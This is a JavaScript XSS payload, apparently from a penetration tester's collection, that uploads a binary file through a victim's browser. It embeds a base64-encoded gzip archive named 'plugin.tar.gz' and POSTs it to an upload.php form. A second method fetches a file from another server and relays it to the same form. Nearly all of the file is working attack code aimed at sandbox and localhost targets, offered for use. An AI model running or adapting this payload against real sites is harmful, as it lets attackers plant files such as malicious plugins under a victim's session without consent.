// How to upload binary files via JavaScript (exploiting XSS vulnerabilities)

// Sources
// https://stackoverflow.com/a/20151856 // Bacher

// Method 1 - Hardcoded Base64 strings in the payload
// cat plugin.tar.gz | base64 -w0
var b64file = "H4sIAAAAAAAAA+3QTQrCMBTE8aw9RU4g76UfOU4I5YGlQiGJ4PEtbgQX6qZI4f/bzGI2w1SbirVzuze3G9mMff/MzXuKhOC0i1GCdqqjE9UhDs7LfpNebrXl4r0r6/rxgm/9QbWLpSkvluaacrrOdvr3IgAAAAAAAAAAAAAAAADALx7H3jW3ACgAAA==";

// Method 2 - Download the file from a srv (!! CORS)
var urlfile = "http://127.0.0.1:8000/secret.tar.gz";

// File upload form parameters
// Content-Disposition: form-data; name="userfile"; filename="plugin.tar.gz"
// Content-Type: application/gzip

var url_upload = "http://127.0.0.1/sandbox/upload.php";
var file_name = 'plugin.tar.gz';
var field_name = 'userfile';
var content_type = 'application/gzip';

function base64toBlob(base64Data, contentType) {
    contentType = contentType || '';
    var sliceSize = 1024;
    var byteCharacters = atob(base64Data);
    var bytesLength = byteCharacters.length;
    var slicesCount = Math.ceil(bytesLength / sliceSize);
    var byteArrays = new Array(slicesCount);

    for (var sliceIndex = 0; sliceIndex < slicesCount; ++sliceIndex) {
        var begin = sliceIndex * sliceSize;
        var end = Math.min(begin + sliceSize, bytesLength);

        var bytes = new Array(end - begin);
        for (var offset = begin, i = 0; offset < end; ++i, ++offset) {
            bytes[i] = byteCharacters[offset].charCodeAt(0);
        }
        byteArrays[sliceIndex] = new Uint8Array(bytes);
    }
    return new Blob(byteArrays, {
        type: contentType
    });
}

function uploadBlob(url, blob, field_name, file_name) {
    var formData = new FormData();
    formData.append(field_name, blob, file_name);
    var request = new XMLHttpRequest();
    request.open('POST', url);
    request.send(formData);
}

// get a file from a server
function UploadFromURL(urlTo, urlFile, field_name, file_name) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", urlFile);
    xhr.responseType = "blob";
    xhr.onload = function(oEvent) {
        var blob = xhr.response;
        uploadBlob(urlTo, blob, field_name, file_name);
    };
    xhr.send(null);
}


// Method 1
var blob = base64toBlob(b64file, content_type);
uploadBlob(url_upload, blob, field_name, file_name);

// Method 2
UploadFromURL(url_upload, urlfile, field_name, "plugin2.tar.gz");
